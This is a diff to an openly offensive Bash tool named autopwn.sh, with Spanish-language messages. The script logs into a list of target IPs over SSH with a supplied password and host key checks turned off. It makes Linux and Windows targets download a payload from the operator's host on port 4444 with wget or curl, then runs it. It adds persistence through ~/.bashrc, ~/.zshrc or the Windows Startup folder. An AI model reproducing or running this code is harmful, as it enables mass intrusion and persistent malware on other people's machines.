@@ -78,6 +78,7 @@ else
 
     dos2unix autopwn.sh
     ./autopwn.sh
+    exit
 fi
 
 sudo clear
@@ -209,7 +210,7 @@ ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
     fi
         
     if echo "$OS" | grep -q "LINUX"; then
-        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd $linworkdir && echo old > $linuxoutname && rm -f $linuxoutname && wget http://$youripalways:4444/$linuxoutname && chmod 777 $linuxoutname && echo correcto && ./$linuxoutname" 2>&1)
+        output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd $linworkdir && pkill writer.elf && echo old > $linuxoutname && rm -f $linuxoutname && wget http://$youripalways:4444/$linuxoutname && chmod 777 $linuxoutname && echo correcto && ./$linuxoutname" 2>&1)
     elif echo "$OS" | grep -q "WINDOWS"; then
         output=$(timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cd \"$winworkdir\" & taskkill /F /IM \"$windowsoutname\" & del \"$windowsoutname\" & curl \"http://$youripalways:4444/$windowsoutname\" --output $windowsoutname & echo correcto & call $windowsoutname" 2>&1)
     fi
@@ -222,7 +223,7 @@ ip=$(sed "${i}q;d" "AutoPWN/ips.txt")
         if [ "$startup" = "si" ]; then
             echo -e "\e[9;38m[\e[9;32m+\e[9;38m] INTENTANDO AÑADIR EL EXPLOIT AL INICIO EN EL PC \e[9;32m$ip\e[9;38m\n\n"
             if echo "$OS" | grep -q "LINUX"; then
-                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cp -f \"$linworkdir/$linuxoutname\" ~/$linuxoutname & grep -q "\$linuxoutname" "~/.bashrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc & echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" >/dev/null 2>&1
+                timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "cp -f \"$linworkdir/$linuxoutname\" ~/$linuxoutname & grep -q "\$linuxoutname" "~/.bashrc" || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.bashrc || echo -e \"output=\\\"\\\`ps aux\\\`\\\"\nif echo \\\"\\\$output\\\" | grep -q \\\"$linuxoutname\\\"; then\nsleep 1\nelse\n./$linuxoutname &\nfi\nclear\" >> ~/.zshrc" >/dev/null 2>&1
             else
                 timeout 9 sshpass -p "$sshpassword" ssh -o StrictHostKeyChecking=no "$sshuser"@"$ip" "copy \"$winworkdir\\$windowsoutname\" \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\$windowsoutname\" /y" >/dev/null 2>&1
             fi
